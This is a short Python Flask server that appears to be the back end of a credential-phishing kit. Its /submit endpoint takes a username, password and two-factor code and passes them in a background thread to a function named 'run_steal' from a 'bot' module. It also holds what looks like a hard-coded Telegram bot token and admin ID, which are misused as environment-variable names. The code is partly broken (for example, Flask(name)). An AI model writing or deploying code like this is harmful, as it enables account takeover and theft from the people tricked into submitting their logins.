from flask import Flask, request, jsonify
import requests
import os
import threading
from bot import run_steal

app = Flask(name)

BOT_TOKEN = os.environ.get('8848238893:AAE8h59lr22XdzVFMstAcaMwM53kidjPzjE')
ADMIN_ID = os.environ.get('6083413220')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    if not data:
        return jsonify({"error": "No JSON"}), 400
    username = data.get('username')
    password = data.get('password')
    twofa = data.get('twofa', '')
    threading.Thread(target=run_steal, args=(username, password, twofa)).start()
    return jsonify({"status": "ok"}), 200